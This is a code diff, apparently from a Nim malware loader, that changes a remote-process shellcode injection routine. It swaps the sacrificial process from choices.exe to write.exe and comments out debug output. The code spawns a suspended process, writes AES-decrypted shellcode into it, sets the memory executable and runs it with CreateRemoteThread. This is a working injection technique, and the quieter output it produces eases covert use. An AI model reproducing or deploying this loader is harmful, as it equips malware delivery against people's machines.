@@ -45,25 +45,25 @@ proc decryptAES(shellcode: string, aes_key: string, iv: string): string =
 
 proc injectCreateRemoteThread[byte](shellcode: openarray[byte]): void =
 
-  let tProcess = startProcess("choices.exe")
+  let tProcess = startProcess("write.exe")
   tProcess.suspend()
   defer: tProcess.close()
 
-  echo "[*] Target Process: ", tProcess.processID
+  #echo "[*] Target Process: ", tProcess.processID
 
   let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcess.processID))
   defer: CloseHandle(pHandle)
 
-  echo "[*] pHandle: ", pHandle
+  #echo "[*] pHandle: ", pHandle
 
   let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE)
 
   var bytesWritten: SIZE_T
   let wSuccess = WriteProcessMemory(pHandle, rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),addr bytesWritten)
 
-  echo "[*] WriteProcessMemory: ", bool(wSuccess)
-  echo "    \\-- bytes written: ", bytesWritten
-  echo ""
+  #echo "[*] WriteProcessMemory: ", bool(wSuccess)
+  #echo "    \\-- bytes written: ", bytesWritten
+  #echo ""
   
   #DEBUG
   #var consoleInput = readLine(stdin);
@@ -71,15 +71,15 @@ proc injectCreateRemoteThread[byte](shellcode: openarray[byte]): void =
   var oldProtect: DWORD
   let protSuccess = VirtualProtectEx(pHandle, cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)
 
-  echo "[*] VirtualProtect: ", bool(protSuccess)
-  echo "    \\-- Changed memory protection back to RX instead of RWX"
-  echo ""
+  # echo "[*] VirtualProtect: ", bool(protSuccess)
+  # echo "    \\-- Changed memory protection back to RX instead of RWX"
+  # echo ""
 
   let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
   defer: CloseHandle(tHandle)
 
-  echo "[*] tHandle: ", tHandle
-  echo "[+] Injected"
+  # echo "[*] tHandle: ", tHandle
+  # echo "[+] Injected"
 
 when defined(windows):
 
